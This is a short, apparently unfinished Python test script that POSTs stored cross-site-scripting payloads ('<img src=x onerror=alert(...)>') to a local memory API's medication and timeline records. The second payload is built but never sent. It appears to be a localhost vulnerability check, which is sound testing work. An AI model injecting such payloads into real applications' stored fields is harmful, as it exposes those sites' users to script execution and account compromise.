import requests

def test_xss():
    url = "http://127.0.0.1:5001/api/memory"
    
    # Payload for Med Status
    payload = {
        "id": "med_xss",
        "type": "med",
        "content": "<img src=x onerror=alert('DOM_XSS_Med')>",
        "schedule": "10:00"
    }
    
    response = requests.post(url, json=payload, timeout=5)
    print("Med Payload status:", response.status_code)

    # Payload for Timeline
    payload_timeline = {
        "id": "timeline_xss",
        "type": "event", # wait, timeline shows type 'timeline' or just gets all nodes with event_date?
        "content": "<img src=x onerror=alert('DOM_XSS_Timeline')>",
        "event_date": "2024-01-01"
    }
    # Wait, timeline uses GET /api/timeline.
    
if __name__ == "__main__":
    test_xss()
